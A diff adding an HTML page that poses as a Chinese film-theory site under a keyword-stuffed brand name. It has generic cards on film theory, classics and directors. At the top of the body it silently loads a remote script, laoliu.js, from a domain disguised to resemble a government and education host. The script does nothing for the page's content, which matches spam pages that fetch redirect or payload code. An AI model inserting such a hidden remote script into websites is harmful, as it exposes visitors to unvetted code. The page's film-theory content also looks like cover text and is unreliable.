@@ -1,0 +1,425 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>秋霞电影网理论片 - 影视资源在线观看</title>
+<meta name="description" content="秋霞电影网理论片（qiuxiadianyingwanglilunpian-h5）提供影视理论、经典赏析、导演作品等高清资源在线观看，官方网址：https://qiuxiadianyingwanglilunpian-h5.github.io">
+<meta name="keywords" content="秋霞电影网理论片, qiuxiadianyingwanglilunpian-h5, 影视理论, 经典赏析, 在线电影">
+<meta name="robots" content="index,follow">
+<style>
+/* ===== Reset ===== */
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box;}
+html{scroll-behavior:smooth;}
+body{
+  font-family:"Georgia","PingFang SC","Microsoft YaHei",serif;
+  background:#fdfbf7;
+  color:#2c2c2c;
+  overflow-x:hidden;
+}
+
+/* ===== 杂志风头部 ===== */
+.mag-header{
+  background:#1a1a1a;
+  color:#f5f0e8;
+  padding:50px 20px 40px;
+  text-align:center;
+  border-bottom:5px solid #c0392b;
+}
+.mag-header .kicker{
+  font-size:12px;
+  letter-spacing:6px;
+  text-transform:uppercase;
+  color:#c0392b;
+  margin-bottom:12px;
+}
+.mag-header h1{
+  font-size:46px;
+  font-weight:900;
+  letter-spacing:2px;
+  margin-bottom:10px;
+}
+.mag-header .tagline{
+  font-size:15px;
+  color:#aaa;
+  font-style:italic;
+}
+.mag-header .url-line{
+  margin-top:18px;
+  font-size:13px;
+  color:#888;
+  letter-spacing:1px;
+}
+
+/* ===== 顶部栏目导航（杂志 tab 风格） ===== */
+.tab-bar{
+  background:#fff;
+  border-bottom:2px solid #1a1a1a;
+  display:flex;
+  justify-content:center;
+  flex-wrap:wrap;
+  gap:0;
+  position:sticky;
+  top:0;
+  z-index:1000;
+}
+.tab-bar a{
+  padding:14px 22px;
+  font-size:14px;
+  color:#555;
+  border-bottom:3px solid transparent;
+  transition:.2s;
+  font-weight:600;
+}
+.tab-bar a:hover{
+  color:#c0392b;
+  border-bottom-color:#c0392b;
+}
+
+/* ===== 通用容器 ===== */
+.wrap{
+  max-width:1080px;
+  margin:0 auto;
+  padding:60px 20px;
+}
+
+/* ===== 栏目一：理论片（瀑布流卡片） ===== */
+.masonry{
+  column-count:3;
+  column-gap:20px;
+}
+@media(max-width:900px){ .masonry{column-count:2;} }
+@media(max-width:560px){ .masonry{column-count:1;} }
+
+.m-card{
+  break-inside:avoid;
+  background:#fff;
+  border:1px solid #e8e2d6;
+  border-radius:4px;
+  padding:24px;
+  margin-bottom:20px;
+  box-shadow:2px 2px 0 rgba(0,0,0,.04);
+  transition:.3s;
+}
+.m-card:hover{
+  transform:translate(-2px,-2px);
+  box-shadow:5px 5px 0 rgba(192,57,43,.2);
+}
+.m-card .badge{
+  display:inline-block;
+  background:#c0392b;
+  color:#fff;
+  font-size:11px;
+  padding:3px 10px;
+  border-radius:2px;
+  margin-bottom:12px;
+  letter-spacing:1px;
+}
+.m-card h3{
+  font-size:19px;
+  margin-bottom:8px;
+  color:#1a1a1a;
+}
+.m-card p{
+  font-size:14px;
+  color:#777;
+  line-height:1.7;
+}
+
+/* ===== 栏目二：经典赏析（大图+文字叠加） ===== */
+.spotlight{
+  display:flex;
+  flex-direction:column;
+  gap:30px;
+}
+.spot-row{
+  position:relative;
+  background:#1a1a1a;
+  border-radius:6px;
+  overflow:hidden;
+  min-height:220px;
+  display:flex;
+  align-items:flex-end;
+}
+.spot-row .spot-bg{
+  position:absolute;
+  inset:0;
+  background:linear-gradient(135deg,#3a3a5c,#1a1a1a);
+  opacity:.9;
+}
+.spot-row:nth-child(2) .spot-bg{
+  background:linear-gradient(135deg,#5c3a3a,#1a1a1a);
+}
+.spot-row:nth-child(3) .spot-bg{
+  background:linear-gradient(135deg,#3a5c4a,#1a1a1a);
+}
+.spot-content{
+  position:relative;
+  padding:30px;
+  color:#fff;
+  z-index:2;
+}
+.spot-content .cat-label{
+  font-size:12px;
+  letter-spacing:3px;
+  color:#e8c07a;
+  margin-bottom:8px;
+}
+.spot-content h3{
+  font-size:26px;
+  margin-bottom:10px;
+}
+.spot-content p{
+  font-size:14px;
+  color:#ccc;
+  max-width:600px;
+}
+
+/* ===== 栏目三：影视理论（定义列表 dl） ===== */
+.theory-dl{
+  background:#fff;
+  border-left:4px solid #c0392b;
+  padding:30px 34px;
+}
+.theory-dl dt{
+  font-size:18px;
+  font-weight:700;
+  color:#c0392b;
+  margin-top:22px;
+  margin-bottom:6px;
+}
+.theory-dl dt:first-child{margin-top:0;}
+.theory-dl dd{
+  font-size:14px;
+  color:#666;
+  line-height:1.9;
+  padding-left:14px;
+  border-left:1px solid #e8e2d6;
+}
+
+/* ===== 栏目四：导演作品（表格结构） ===== */
+.dir-table{
+  width:100%;
+  border-collapse:collapse;
+  background:#fff;
+  font-size:14px;
+}
+.dir-table th{
+  background:#1a1a1a;
+  color:#fff;
+  padding:14px 12px;
+  text-align:left;
+  font-size:13px;
+  letter-spacing:1px;
+}
+.dir-table td{
+  padding:14px 12px;
+  border-bottom:1px solid #e8e2d6;
+  color:#555;
+}
+.dir-table tr:hover td{
+  background:#fdf3f2;
+  color:#c0392b;
+}
+.dir-table .yr{
+  font-weight:700;
+  color:#1a1a1a;
+}
+
+/* ===== 栏目标题（杂志分割线风） ===== */
+.sec-head{
+  display:flex;
+  align-items:center;
+  gap:16px;
+  margin-bottom:36px;
+}
+.sec-head .line{
+  flex:1;
+  height:1px;
+  background:#d4ccbb;
+}
+.sec-head h2{
+  font-size:24px;
+  color:#1a1a1a;
+  letter-spacing:1px;
+}
+.sec-head .en{
+  font-size:11px;
+  color:#c0392b;
+  letter-spacing:3px;
+  text-transform:uppercase;
+}
+
+/* ===== 底部 ===== */
+.mag-footer{
+  background:#1a1a1a;
+  color:#888;
+  padding:40px 20px;
+  text-align:center;
+}
+.mag-footer .foot-brand{
+  font-size:20px;
+  color:#f5f0e8;
+  font-weight:700;
+  margin-bottom:10px;
+}
+.mag-footer p{
+  font-size:13px;
+  margin:4px 0;
+}
+.mag-footer .foot-link{color:#c0392b;}
+
+/* ===== 移动端 ===== */
+@media(max-width:768px){
+  .mag-header h1{font-size:32px;}
+  .tab-bar a{padding:12px 14px;font-size:13px;}
+  .spot-content h3{font-size:20px;}
+  .dir-table{font-size:13px;}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<!-- 头部 -->
+<header class="mag-header">
+  <div class="kicker">Film Theory &amp; Classics</div>
+  <h1>秋霞电影网 · 理论片</h1>
+  <p class="tagline">影视理论与经典赏析，深度解读每一帧</p>
+  <p class="url-line">🌐 https://qiuxiadianyingwanglilunpian-h5.github.io</p>
+</header>
+
+<!-- 导航 -->
+<nav class="tab-bar">
+  <a href="#theory">理论片库</a>
+  <a href="#spotlight">经典赏析</a>
+  <a href="#concept">影视理论</a>
+  <a href="#director">导演作品</a>
+</nav>
+
+<!-- 栏目一：理论片库（瀑布流） -->
+<section id="theory" class="wrap">
+  <div class="sec-head">
+    <span class="en">Theory Films</span>
+    <h2>理论片库</h2>
+    <span class="line"></span>
+  </div>
+  <div class="masonry">
+    <div class="m-card">
+      <span class="badge">理论</span>
+      <h3>镜头语言解析</h3>
+      <p>从构图、运镜到光影，系统解读电影镜头背后的表达逻辑与艺术手法。</p>
+    </div>
+    <div class="m-card">
+      <span class="badge">经典</span>
+      <h3>影史百佳赏析</h3>
+      <p>精选世界电影史上具有里程碑意义的经典作品，逐帧深度赏析。</p>
+    </div>
+    <div class="m-card">
+      <span class="badge">理论</span>
+      <h3>蒙太奇与剪辑</h3>
+      <p>探索苏联蒙太奇学派到现代剪辑理论的发展脉络与实战应用。</p>
+    </div>
+    <div class="m-card">
+      <span class="badge">纪录</span>
+      <h3>电影史话</h3>
+      <p>从卢米埃尔兄弟到数字时代，完整呈现电影工业的百年演进。</p>
+    </div>
+    <div class="m-card">
+      <span class="badge">经典</span>
+      <h3>大师访谈录</h3>
+      <p>收录世界级导演、摄影师的深度访谈，倾听创作背后的思考。</p>
+    </div>
+    <div class="m-card">
+      <span class="badge">理论</span>
+      <h3>类型片研究</h3>
+      <p>系统梳理西部片、黑色电影、科幻片等类型片的叙事范式与演变。</p>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目二：经典赏析（大图叠加） -->
+<section id="spotlight" class="wrap">
+  <div class="sec-head">
+    <span class="en">Spotlight</span>
+    <h2>经典赏析</h2>
+    <span class="line"></span>
+  </div>
+  <div class="spotlight">
+    <div class="spot-row">
+      <div class="spot-bg"></div>
+      <div class="spot-content">
+        <div class="cat-label">FEATURED · 01</div>
+        <h3>意大利新现实主义</h3>
+        <p>以《偷自行车的人》为代表，关注底层人民生活，开创纪实美学新风潮。</p>
+      </div>
+    </div>
+    <div class="spot-row">
+      <div class="spot-bg"></div>
+      <div class="spot-content">
+        <div class="cat-label">FEATURED · 02</div>
+        <h3>法国新浪潮</h3>
+        <p>打破传统叙事规则，用跳切与实景拍摄重新定义电影的可能性。</p>
+      </div>
+    </div>
+    <div class="spot-row">
+      <div class="spot-bg"></div>
+      <div class="spot-content">
+        <div class="cat-label">FEATURED · 03</div>
+        <h3>东方美学影像</h3>
+        <p>从留白到意境，东方电影独特的视觉哲学与叙事节奏。</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目三：影视理论（定义列表） -->
+<section id="concept" class="wrap">
+  <div class="sec-head">
+    <span class="en">Concepts</span>
+    <h2>影视理论</h2>
+    <span class="line"></span>
+  </div>
+  <dl class="theory-dl">
+    <dt>长镜头理论</dt>
+    <dd>强调时间的连续性，通过 uninterrupted 的连续拍摄保留现实的原生质感与空间真实感。</dd>
+    <dt>作者论（Auteur Theory）</dt>
+    <dd>主张导演是电影真正的"作者"，其个人风格与世界观贯穿作品始终，是评判艺术价值的核心标准。</dd>
+    <dt>符号学与电影</dt>
+    <dd>将电影视为符号系统，研究画面、声音、色彩如何作为能指传递深层意义与文化编码。</dd>
+    <dt>性别与凝视理论</dt>
+    <dd>探讨摄影机视角中的权力关系，以及电影如何构建与再现性别身份与观看方式。</dd>
+  </dl>
+</section>
+
+<!-- 栏目四：导演作品（表格） -->
+<section id="director" class="wrap">
+  <div class="sec-head">
+    <span class="en">Directors</span>
+    <h2>代表导演</h2>
+    <span class="line"></span>
+  </div>
+  <table class="dir-table">
+    <thead>
+      <tr><th>年份</th><th>导演</th><th>代表作品</th><th>流派</th></tr>
+    </thead>
+    <tbody>
+      <tr><td class="yr">1954</td><td>黑泽明</td><td>七武士</td><td>日本电影</td></tr>
+      <tr><td class="yr">1960</td><td>费德里科·费里尼</td><td>甜蜜的生活</td><td>意大利</td></tr>
+      <tr><td class="yr">1974</td><td>弗朗西斯·科波拉</td><td>教父2</td><td>美国新好莱坞</td></tr>
+      <tr><td class="yr">1994</td><td>王家卫</td><td>重庆森林</td><td>华语艺术片</td></tr>
+      <tr><td class="yr">2001</td><td>王家卫</td><td>花样年华</td><td>华语艺术片</td></tr>
+    </tbody>
+  </table>
+</section>
+
+<!-- 底部 -->
+<footer class="mag-footer">
+  <div class="foot-brand">秋霞电影网 · 理论片</div>
+  <p>官方网址：<span class="foot-link">https://qiuxiadianyingwanglilunpian-h5.github.io</span></p>
+  <p>© 2026 秋霞电影网理论片 | 影视理论与经典赏析</p>
+</footer>
+
+</body>
+</html>
